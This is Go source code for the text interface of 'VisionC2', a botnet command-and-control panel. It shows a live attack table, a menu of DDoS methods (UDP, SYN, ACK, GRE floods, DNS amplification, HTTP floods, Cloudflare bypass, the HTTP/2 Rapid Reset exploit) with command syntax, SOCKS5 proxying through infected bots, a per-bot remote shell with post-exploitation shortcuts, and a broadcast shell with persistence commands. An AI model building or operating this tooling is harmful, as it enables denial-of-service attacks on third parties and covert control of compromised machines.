			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("          ◇ NO ACTIVE ATTACK OPERATIONS ◇           ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("     Use the LAUNCH tab to initiate an attack        ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    └─────────────────────────────────────────────────────┘") + "\n")
		} else {
			// Active attacks header
			b.WriteString(neonRed.Bold(true).Render("    ┌─ LIVE ATTACK OPERATIONS ────────────────────────────┐") + "\n")

			// Table header
			b.WriteString(neonRed.Bold(true).Render("    │ "))
			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-10s", "METHOD")))
			b.WriteString(dim.Render(" │ "))
			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-18s", "TARGET")))
			b.WriteString(dim.Render(" │ "))
			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-6s", "TIME")))
			b.WriteString(dim.Render(" │ "))
			b.WriteString(neonPurple.Bold(true).Render("PROGRESS"))
			b.WriteString(neonRed.Bold(true).Render("     │") + "\n")

			b.WriteString(neonRed.Bold(true).Render("    ├──────────────────────────────────────────────────────┤") + "\n")

			// Display all attacks
			allAttacks := []struct {
				method    string
				target    string
				port      string
				remaining time.Duration
				total     time.Duration
			}{}

			ongoingAttacksLock.RLock()
			for _, attack := range ongoingAttacks {
				remaining := time.Until(attack.start.Add(attack.duration))
				if remaining > 0 {
					allAttacks = append(allAttacks, struct {
						method    string
						target    string
						port      string
						remaining time.Duration
						total     time.Duration
					}{attack.method, attack.ip, attack.port, remaining, attack.duration})
				}
			}
			ongoingAttacksLock.RUnlock()

			for _, attack := range tuiAttacks {
				remaining := time.Until(attack.Start.Add(attack.Duration))
				if remaining > 0 {
					allAttacks = append(allAttacks, struct {
						method    string
						target    string
						port      string
						remaining time.Duration
						total     time.Duration
					}{attack.Method, attack.Target, attack.Port, remaining, attack.Duration})
				}
			}

			for _, atk := range allAttacks {
				progress := 1.0 - (atk.remaining.Seconds() / atk.total.Seconds())
				barWidth := 10
				filled := int(progress * float64(barWidth))
				if filled > barWidth {
					filled = barWidth
				}

				// Gradient progress bar
				var bar string
				for i := 0; i < barWidth; i++ {
					if i < filled {
						if progress > 0.7 {
							bar += neonRed.Render("█")
						} else if progress > 0.4 {
							bar += neonOrange.Render("█")
						} else {
							bar += neonYellow.Render("█")
						}
					} else {
						bar += darkGray.Render("░")
					}
				}

				remainStr := fmt.Sprintf("%ds", int(atk.remaining.Seconds()))

				b.WriteString(neonRed.Bold(true).Render("    │ "))
				b.WriteString(neonCyan.Bold(true).Render(fmt.Sprintf("%-10s", truncate(atk.method, 10))))
				b.WriteString(dim.Render(" │ "))
				b.WriteString(white.Render(fmt.Sprintf("%-18s", truncate(atk.target+":"+atk.port, 18))))
				b.WriteString(dim.Render(" │ "))
				b.WriteString(neonGreen.Render(fmt.Sprintf("%-6s", remainStr)))
				b.WriteString(dim.Render(" │ "))
				b.WriteString(bar)
				b.WriteString(fmt.Sprintf(" %3d%%", int(progress*100)))
				b.WriteString(neonRed.Bold(true).Render(" │") + "\n")
			}

			b.WriteString(neonRed.Bold(true).Render("    └──────────────────────────────────────────────────────┘") + "\n")
		}

		// Controls
		b.WriteString("\n")
		b.WriteString(dim.Render("    ╭─────────────────────────────────────────────────────╮") + "\n")
		b.WriteString(dim.Render("    │ "))
		b.WriteString(neonRed.Bold(true).Render("[S]") + dim.Render(" STOP ALL  "))
		b.WriteString(neonCyan.Render("[←]") + dim.Render(" Launch  "))
		b.WriteString(neonGreen.Render("[R]") + dim.Render(" Refresh  "))
		b.WriteString(neonYellow.Render("[Q]") + dim.Render(" Back     "))
		b.WriteString(dim.Render("│") + "\n")
		b.WriteString(dim.Render("    ╰─────────────────────────────────────────────────────╯") + "\n")
	}

	return b.String()
}

func (m TUIModel) viewMethodSelect() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("  ⚡ SELECT ATTACK METHOD"))
	b.WriteString("\n\n")

	// Layer 4 attacks
	b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true).Render("  LAYER 4 (Network)"))
	b.WriteString("\n")
	b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 50)))
	b.WriteString("\n")

	for i, method := range attackMethods {
		if i == 8 { // After L4 methods, show L7 header
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true).Render("  LAYER 7 (Application)"))
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 50)))
			b.WriteString("\n")
		}
		if i == 2 { // HTTP methods are L7
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true).Render("  LAYER 7 (Application)"))
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 50)))
			b.WriteString("\n")
		}

		cursor := "  "
		style := menuItemStyle
		if i == m.methodCursor {
			cursor = "▸ "
			style = menuSelectedStyle
		}

		b.WriteString(fmt.Sprintf("%s%s  %s\n",
			cursor,
			style.Render(fmt.Sprintf("%-12s", method.name)),
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(method.desc),
		))
	}

	b.WriteString("\n")
	b.WriteString(subtitleStyle.Render("  [enter] Select  [q] Back"))
	b.WriteString("\n")

	return b.String()
}

func (m TUIModel) viewSocks() string {
	var b strings.Builder

	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  🧦 SOCKS5 PROXY MANAGER"))
	b.WriteString("\n")

	// View mode tabs
	viewModes := []string{"All Bots", "Active Socks", "Stopped"}
	b.WriteString("  ")
	for i, mode := range viewModes {
		if i == m.socksViewMode {
			b.WriteString(neonCyan.Bold(true).Render(" [" + mode + "] "))
		} else {
			b.WriteString(dim.Render("  " + mode + "  "))
		}
	}
	b.WriteString("\n")
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	// Stats
	activeCount := 0
	for _, sock := range m.socksList {
		if sock.Status == "active" {
			activeCount++
		}
	}
	b.WriteString(fmt.Sprintf("  %s %s   %s %s   %s %s\n\n",
		dim.Render("Bots:"), white.Render(fmt.Sprintf("%d", len(m.bots))),
		dim.Render("Active Proxies:"), neonGreen.Render(fmt.Sprintf("%d", activeCount)),
		dim.Render("Bind:"), neonYellow.Render("0.0.0.0")))

	// Build display list based on view mode
	type displayItem struct {
		botID   string
		botIP   string
		botArch string
		port    string
		status  string
		started time.Time
	}
	var items []displayItem

	switch m.socksViewMode {
	case 0: // All Bots - show all connected bots
		for _, bot := range m.bots {
			item := displayItem{
				botID:   bot.ID,
				botIP:   bot.IP,
				botArch: bot.Arch,
				status:  "none",
			}
			// Check if this bot has active socks
			for _, sock := range m.socksList {
				if sock.BotID == bot.ID {
					item.port = sock.Port
					item.status = sock.Status
					item.started = sock.StartedAt
					break
				}
			}
			items = append(items, item)
		}
	case 1: // Active Socks only
		for _, sock := range m.socksList {
			if sock.Status == "active" {
				// Find bot info
				arch := ""
				for _, bot := range m.bots {
					if bot.ID == sock.BotID {
						arch = bot.Arch
						break
					}
				}
				items = append(items, displayItem{
					botID:   sock.BotID,
					botIP:   sock.BotIP,
					botArch: arch,
					port:    sock.Port,
					status:  "active",
					started: sock.StartedAt,
				})
			}
		}
	case 2: // Stopped
		for _, sock := range m.socksList {
			if sock.Status == "stopped" {
				arch := ""
				for _, bot := range m.bots {
					if bot.ID == sock.BotID {
						arch = bot.Arch
						break
					}
				}
				items = append(items, displayItem{
					botID:   sock.BotID,
					botIP:   sock.BotIP,
					botArch: arch,
					port:    sock.Port,
					status:  "stopped",
					started: sock.StartedAt,
				})
			}
		}
	}

	if len(items) == 0 {
		if m.socksViewMode == 0 {
			b.WriteString(dim.Render("  No bots connected"))
		} else {
			b.WriteString(dim.Render("  No socks proxies in this view"))
		}
		b.WriteString("\n")
	} else {
		// Table header
		header := fmt.Sprintf("  %-18s %-16s %-10s %-8s %-10s", "BOT ID", "IP", "ARCH", "PORT", "STATUS")
		b.WriteString(dim.Render(header))
		b.WriteString("\n")
		b.WriteString(dim.Render("  " + strings.Repeat("─", 66)))
		b.WriteString("\n")

		// Show max 10 items
		displayCount := len(items)
		if displayCount > 10 {
			displayCount = 10
		}

		for i := 0; i < displayCount; i++ {
			item := items[i]
			cursor := "  "
			style := botItemStyle
			if i == m.socksCursor {
				cursor = "▸ "
				style = botSelectedStyle
			}

			// Status + port display
			var statusStyled, portDisplay string
			switch item.status {
			case "active":
				statusStyled = neonGreen.Render("● ACTIVE")
				portDisplay = neonYellow.Render(item.port)
			case "stopped":
				statusStyled = neonRed.Render("○ STOPPED")
				portDisplay = dim.Render(item.port)
			default:
				statusStyled = dim.Render("- NONE")
				portDisplay = dim.Render("-")
			}

			line := fmt.Sprintf("%-18s %-16s %-10s ",
				truncate(item.botID, 16),
				maskIP(item.botIP),
				item.botArch,
			)
			b.WriteString(fmt.Sprintf("%s%s", cursor, style.Render(line)))
			b.WriteString(fmt.Sprintf("%-8s ", portDisplay))
			b.WriteString(statusStyled)
			b.WriteString("\n")
		}

		if len(items) > 10 {
			b.WriteString(dim.Render(fmt.Sprintf("  ... and %d more", len(items)-10)))
			b.WriteString("\n")
		}
	}

	b.WriteString("\n")
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n")

	// Input mode or normal mode
	if m.socksInputMode {
		b.WriteString(neonPink.Bold(true).Render("  START SOCKS5 PROXY"))
		b.WriteString("\n")
		if m.socksCursor < len(items) {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				dim.Render("Bot:"),
				neonCyan.Render(items[m.socksCursor].botID)))
		}
		cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
		b.WriteString(fmt.Sprintf("  %s %s%s\n",
			neonCyan.Render("▸ Port:"),
			neonGreen.Render(m.socksNewPort),
			cursor))
		b.WriteString("\n")
		b.WriteString(dim.Render("  [enter] Start Socks   [esc] Cancel"))
		b.WriteString("\n")
	} else {
		// Hotkey help
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(fmt.Sprintf("  %s Start Socks   %s Stop Socks   %s/%s View   %s Refresh   %s Back\n",
			hotkey.Render("[s]"),
			hotkey.Render("[x]"),
			hotkey.Render("[←]"),
			hotkey.Render("[→]"),
			hotkey.Render("[r]"),
			hotkey.Render("[q]")))
	}

	return b.String()
}

func (m TUIModel) viewRemoteShell() string {
	var b strings.Builder

	// Header with bot info
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  💻 REMOTE SHELL"))
	b.WriteString("\n")

	// Tab bar
	remoteTabs := []string{"Shell", "Shortcuts", "Linux"}
	for i, tab := range remoteTabs {
		if i == m.remoteShellTab {
			b.WriteString(neonCyan.Bold(true).Render(" [" + tab + "] "))
		} else {
			b.WriteString(dim.Render("  " + tab + "  "))
		}
	}
	b.WriteString("\n")

	b.WriteString(fmt.Sprintf("  %s %s %s %s\n",
		dim.Render("Bot:"),
		neonCyan.Render(truncate(m.selectedBot, 20)),
		dim.Render("│ Arch:"),
		neonYellow.Render(m.selectedBotArch)))
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))

	switch m.remoteShellTab {
	case 0: // Shell tab
		outputHeight := 13
		totalLines := len(m.shellOutput)

		// Calculate visible window based on scroll offset
		endIdx := totalLines - m.shellScrollOffset
		if endIdx < 0 {
			endIdx = 0
		}
		startIdx := endIdx - outputHeight
		if startIdx < 0 {
			startIdx = 0
		}

		visibleLines := 0
		for i := startIdx; i < endIdx; i++ {
			b.WriteString("  " + m.shellOutput[i] + "\n")
			visibleLines++
		}

		for i := visibleLines; i < outputHeight; i++ {
			b.WriteString("\n")
		}

		// Scroll indicator
		if m.shellScrollOffset > 0 {
			scrollInfo := fmt.Sprintf("  ─── ↑ %d more lines (pgup/pgdown) ", m.shellScrollOffset)
			b.WriteString(dim.Render(scrollInfo))
		} else if totalLines > outputHeight {
			b.WriteString(dim.Render("  ─── end (pgup to scroll) "))
		} else {
			b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
		}
		b.WriteString("\n")

		if m.confirmKill {
			warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
			b.WriteString(warnStyle.Render("  ⚠️  KILL BOT? This will remove the bot permanently!"))
			b.WriteString("\n")
			b.WriteString(fmt.Sprintf("  %s Yes  %s No\n",
				neonGreen.Render("[y]"),
				neonRed.Render("[n]")))
		} else {
			prompt := neonGreen.Render("  $ ")
			cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("█")
			b.WriteString(prompt + m.shellInput + cursor)
			b.WriteString("\n\n")

			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
			b.WriteString(dim.Render("  [enter] Execute  [↑/↓] History  [pgup/pgdn] Scroll  [ctrl+f] Clear  [esc] Menu\n"))
			b.WriteString(fmt.Sprintf("  %s !persist  %s !reinstall  %s !kill\n",
				hotkey.Render("[ctrl+p]"),
				hotkey.Render("[ctrl+r]"),
				hotkey.Render("[ctrl+x]")))
		}

	case 1: // Post-exploitation shortcuts tab
		b.WriteString(neonRed.Bold(true).Render("  ⚡ POST-EXPLOITATION SHORTCUTS"))
		b.WriteString("\n")
		b.WriteString(dim.Render("  Select and press Enter to run on this bot.") + "\n\n")

		renderShortcutList(&b, postExShortcuts, m.remoteShortcutCur, neonPink, neonCyan, dim, white)

		b.WriteString("\n")
		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
		b.WriteString("\n")
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(fmt.Sprintf("  %s Execute   %s Navigate   %s Tab   %s Menu\n",
			hotkey.Render("[enter]"),
			hotkey.Render("[↑/↓]"),
			hotkey.Render("[←/→]"),
			hotkey.Render("[esc]")))

	case 2: // Linux helpers tab
		b.WriteString(neonGreen.Bold(true).Render("  🐧 LINUX RECON HELPERS"))
		b.WriteString("\n")
		b.WriteString(dim.Render("  Select and press Enter to run on this bot.") + "\n\n")

		renderShortcutList(&b, linuxHelpers, m.remoteShortcutCur, neonPink, neonCyan, dim, white)

		b.WriteString("\n")
		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
		b.WriteString("\n")
		hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
		b.WriteString(fmt.Sprintf("  %s Execute   %s Navigate   %s Tab   %s Menu\n",
			hotkey.Render("[enter]"),
			hotkey.Render("[↑/↓]"),
			hotkey.Render("[←/→]"),
			hotkey.Render("[esc]")))
	}

	return b.String()
}

func (m TUIModel) viewBroadcastShell() string {
	var b strings.Builder

	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  📡 BROADCAST SHELL"))
	b.WriteString("\n")

	// Tab bar
	tabs := []string{"Command", "Shortcuts"}
	for i, tab := range tabs {
		if i == m.broadcastTab {
			b.WriteString(neonCyan.Bold(true).Render(" [" + tab + "] "))
		} else {
			b.WriteString(dim.Render("  " + tab + "  "))
		}
	}
	b.WriteString("\n")

	// Targeting info - aligned layout
	archDisplay := "ALL"
	if m.broadcastArch != "" {
		archDisplay = m.broadcastArch
	}
	ramDisplay := "ANY"
	if m.broadcastMinRAM > 0 {
		ramDisplay = fmt.Sprintf("≥%dMB", m.broadcastMinRAM)
	}
	countDisplay := "ALL"
	if m.broadcastMaxBots > 0 {
		countDisplay = fmt.Sprintf("≤%d", m.broadcastMaxBots)
	}

	b.WriteString(fmt.Sprintf("  %-6s %-10s │ %-6s %-10s │ %-5s %-8s │ %-5s %-6s\n",
		dim.Render("Mode:"), neonPink.Render("DETACHED"),
		dim.Render("Arch:"), neonCyan.Render(fmt.Sprintf("%-8s", archDisplay)),
		dim.Render("RAM:"), neonYellow.Render(fmt.Sprintf("%-6s", ramDisplay)),
		dim.Render("Max:"), neonYellow.Render(countDisplay)))
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	switch m.broadcastTab {
	case 0: // Command tab
		b.WriteString(dim.Render("  Commands run detached — no output returned.") + "\n\n")

		// Command history (last 8 commands)
		historyStart := 0
		if len(m.shellHistory) > 8 {
			historyStart = len(m.shellHistory) - 8
		}
		if len(m.shellHistory) > 0 {
			b.WriteString(dim.Render("  Recent") + "\n")
			for i := historyStart; i < len(m.shellHistory); i++ {
				b.WriteString(fmt.Sprintf("  %s %s\n",
					neonPink.Render("»"),
					white.Render(m.shellHistory[i])))
			}
		}

		// Pad to keep layout stable
		historyShown := len(m.shellHistory) - historyStart
		if historyShown > 0 {
			historyShown += 2 // label + info line
		} else {
			historyShown = 1 // info line
		}
		for i := historyShown; i < 11; i++ {
			b.WriteString("\n")
		}

		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
		b.WriteString("\n")

		// Input prompt or confirmation
		if m.confirmBroadcast || m.confirmPersist || m.confirmReinstall {
			m.renderBroadcastConfirm(&b, neonGreen, neonRed, neonCyan, neonYellow, dim, white)
		} else {
			prompt := neonPink.Render("  » ")
			cursor := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Render("█")
			b.WriteString(prompt + m.shellInput + cursor)
			b.WriteString("\n\n")

			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
			b.WriteString(dim.Render("  [enter] Send   [↑/↓] History   [←/→] Tab   [esc] Menu\n"))
			b.WriteString(fmt.Sprintf("  %s !persist   %s !reinstall   %s Arch   %s RAM   %s Max\n",
				hotkey.Render("[ctrl+p]"),
				hotkey.Render("[ctrl+r]"),
				hotkey.Render("[ctrl+a]"),
				hotkey.Render("[ctrl+g]"),
				hotkey.Render("[ctrl+n]")))
		}

	case 1: // Shortcuts tab
		b.WriteString(neonRed.Bold(true).Render("  ⚡ POST-EXPLOITATION SHORTCUTS"))
		b.WriteString("\n\n")

		renderShortcutList(&b, postExShortcuts, m.shortcutCursor, neonPink, neonCyan, dim, white)

		b.WriteString("\n")
		b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
		b.WriteString("\n")
		if m.confirmBroadcast {
			m.renderBroadcastConfirm(&b, neonGreen, neonRed, neonCyan, neonYellow, dim, white)
		} else {
			hotkey := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
			b.WriteString(fmt.Sprintf("  %s Execute   %s Navigate   %s Tab   %s Arch   %s RAM   %s Max\n",
				hotkey.Render("[enter]"),
				hotkey.Render("[↑/↓]"),
				hotkey.Render("[←/→]"),
				hotkey.Render("[ctrl+a]"),
				hotkey.Render("[ctrl+g]"),
				hotkey.Render("[ctrl+n]")))
		}

	}

	return b.String()
}

// renderShortcutList renders a scrollable shortcut list with cursor highlight
func renderShortcutList(b *strings.Builder, list []broadcastShortcut, cursor int,
	neonPink, neonCyan, dim, white lipgloss.Style) {

	// Scrolling window of 10 items max
	maxVisible := 10
	startIdx := 0
	if cursor >= maxVisible {
		startIdx = cursor - maxVisible + 1
	}
	endIdx := startIdx + maxVisible
	if endIdx > len(list) {
		endIdx = len(list)
	}

	for i := startIdx; i < endIdx; i++ {
		sc := list[i]
		if i == cursor {
			selector := neonPink.Bold(true).Render(" ► ")
			name := neonCyan.Bold(true).Render(fmt.Sprintf("%-16s", sc.name))
			desc := white.Render(sc.desc)
			b.WriteString(fmt.Sprintf("  %s%s %s\n", selector, name, desc))
		} else {
			name := dim.Render(fmt.Sprintf("%-16s", sc.name))
			desc := dim.Render(sc.desc)
			b.WriteString(fmt.Sprintf("      %s %s\n", name, desc))
		}
	}

	// Scroll indicator
	if len(list) > maxVisible {
		b.WriteString(dim.Render(fmt.Sprintf("  %d/%d", cursor+1, len(list))))
		if startIdx > 0 {
			b.WriteString(dim.Render(" ↑"))
		}
		if endIdx < len(list) {
			b.WriteString(dim.Render(" ↓"))
		}
		b.WriteString("\n")
	}
}

// renderBroadcastConfirm renders the confirmation prompt for broadcast commands
func (m TUIModel) renderBroadcastConfirm(b *strings.Builder,
	neonGreen, neonRed, neonCyan, neonYellow, dim, white lipgloss.Style) {

	warnStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true)
	targetCount := countFilteredBots(m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)

	if m.confirmPersist {
		b.WriteString(warnStyle.Render(fmt.Sprintf("  ⚠️  Broadcast !persist to %d bots?", targetCount)))
	} else if m.confirmReinstall {
		b.WriteString(warnStyle.Render(fmt.Sprintf("  ⚠️  Broadcast !reinstall to %d bots?", targetCount)))
	} else {
		// Truncate long commands for display
		displayCmd := m.pendingBroadcastCmd
		if len(displayCmd) > 50 {
			displayCmd = displayCmd[:47] + "..."
		}
		b.WriteString(warnStyle.Render(fmt.Sprintf("  ⚠️  Broadcast to %d bots:", targetCount)))
		b.WriteString("\n")
		b.WriteString("  " + neonCyan.Render(displayCmd))
	}
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  %s Confirm   %s Cancel\n",
		neonGreen.Render("[y]"),
		neonRed.Render("[n]")))
}

func (m TUIModel) viewHelp() string {
	var b strings.Builder

	// Styles
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	neonPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  ☾℣☽ HELP & DOCUMENTATION"))
	b.WriteString("\n\n")

	// Section tabs with page indicator
	sections := []string{"Start", "Keys", "Attacks", "Bots", "Shell", "SOCKS", "Network", "FAQ", "About"}
	for i, sec := range sections {
		if i == m.helpSection {
			b.WriteString(neonCyan.Bold(true).Render(" [" + sec + "] "))
		} else {
			b.WriteString(dim.Render("  " + sec + "  "))
		}
	}
	b.WriteString("\n")
	b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
	b.WriteString("\n")
	b.WriteString(dim.Render(fmt.Sprintf("  Page %d/%d", m.helpSection+1, len(sections))))
	b.WriteString("\n\n")

	switch m.helpSection {
	case 0: // Quick Start
		b.WriteString(neonPink.Bold(true).Render("  🚀 QUICK START GUIDE"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Overview") + "\n")
		b.WriteString(white.Render("  VisionC2 is a command & control framework with a full") + "\n")
		b.WriteString(white.Render("  terminal UI. Navigate with arrow keys and hotkeys.") + "\n\n")

		b.WriteString(neonOrange.Render("  Getting Started") + "\n")
		steps := []struct{ step, desc string }{
			{"1.", "Dashboard loads on startup with live stats"},
			{"2.", "Use ↑/↓ and Enter to navigate the main menu"},
			{"3.", "Open Bot Management to view connected bots"},
			{"4.", "Select a bot and press Enter for remote shell"},
			{"5.", "Use Attack Center to launch attacks"},
			{"6.", "Press q or Esc to go back at any time"},
		}
		for _, s := range steps {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(s.step),
				white.Render(s.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Main Menu Items") + "\n")
		menuItems := []struct{ item, desc string }{
			{"BOT MANAGEMENT", "View and manage connected bots"},
			{"ATTACK CENTER", "Configure and launch attacks"},
			{"BROADCAST SHELL", "Send commands to all bots"},
			{"SOCKS MANAGER", "SOCKS5 proxy management"},
			{"HELP & INFO", "This documentation (you are here)"},
		}
		for _, mi := range menuItems {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-18s", mi.item)),
				dim.Render(mi.desc)))
		}

	case 1: // Navigation Controls
		b.WriteString(neonPink.Bold(true).Render("  ⌨️  NAVIGATION CONTROLS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Global Keys (work in most views)") + "\n")
		globalKeys := []struct{ key, desc string }{
			{"↑ / k", "Move cursor up"},
			{"↓ / j", "Move cursor down"},
			{"← / h", "Previous tab / section"},
			{"→ / l", "Next tab / section"},
			{"enter", "Select / Confirm action"},
			{"tab", "Cycle through views"},
			{"1-4", "Jump directly to view"},
			{"r", "Refresh current data"},
			{"q", "Back to previous screen"},
			{"esc", "Return to main menu"},
			{"ctrl+c", "Quit application"},
		}
		for _, k := range globalKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Attack Center Keys") + "\n")
		attackKeys := []struct{ key, desc string }{
			{"tab", "Cycle through input fields"},
			{"enter", "Confirm field / select method"},
			{"l", "Launch configured attack"},
			{"s", "Stop all ongoing attacks"},
			{"←/→", "Switch Launch / Ongoing tabs"},
		}
		for _, k := range attackKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

	case 2: // Attacks
		b.WriteString(neonRed.Bold(true).Render("  ⚡ ATTACK METHODS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  LAYER 4 — Network/Transport") + "\n")
		l4attacks := []struct{ name, cmd, desc string }{
			{"UDP Flood", "!udpflood", "High-volume 1024-byte UDP packets"},
			{"TCP Flood", "!tcpflood", "TCP connection table exhaustion"},
			{"SYN Flood", "!syn", "Raw SYN packets, random source ports"},
			{"ACK Flood", "!ack", "ACK packet flooding (raw TCP)"},
			{"GRE Flood", "!gre", "GRE protocol (47) max payload"},
			{"DNS Amp", "!dns", "Randomized query types (A/AAAA/MX/NS)"},
		}
		for _, a := range l4attacks {
			b.WriteString(fmt.Sprintf("  %s %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-10s", a.name)),
				neonGreen.Render(fmt.Sprintf("%-12s", a.cmd)),
				dim.Render(a.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  LAYER 7 — Application") + "\n")
		l7attacks := []struct{ name, cmd, desc string }{
			{"HTTP GET", "!http", "GET/POST with random headers + UAs"},
			{"HTTPS/TLS", "!https", "TLS handshake exhaustion + burst"},
			{"CF Bypass", "!cfbypass", "Cloudflare session/cookie reuse"},
			{"Rapid Reset", "!rapidreset", "HTTP/2 CVE-2023-44487 exploit"},
		}
		for _, a := range l7attacks {
			b.WriteString(fmt.Sprintf("  %s %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", a.name)),
				neonGreen.Render(fmt.Sprintf("%-14s", a.cmd)),
				dim.Render(a.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Usage Syntax") + "\n")
		b.WriteString(white.Render("  TUI:   Select method → enter target/port/duration → L to launch") + "\n")
		b.WriteString(white.Render("  Split: !method target port duration [-p proxy_url]") + "\n")
		b.WriteString("\n")
		b.WriteString(dim.Render("  L7 methods support proxy URLs for distributed attacks.") + "\n")
		b.WriteString(dim.Render("  Proxies: HTTP, SOCKS5 — set in the Proxy URL field.") + "\n")

	case 3: // Bot Management
		b.WriteString(neonGreen.Bold(true).Render("  🤖 BOT MANAGEMENT"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Bot List View") + "\n")
		b.WriteString(white.Render("  Displays all connected bots with live statistics.") + "\n\n")
		columns := []struct{ col, desc string }{
			{"ID", "8-char unique bot identifier"},
			{"IP", "Bot IP address and port"},
			{"Arch", "CPU architecture (amd64, arm64, mips...)"},
			{"RAM", "Total system memory in MB"},
			{"CPU", "Number of CPU cores"},
			{"GEO", "Country code via GeoIP"},
			{"Process", "Disguised process name"},
			{"Uplink", "Network upload speed"},
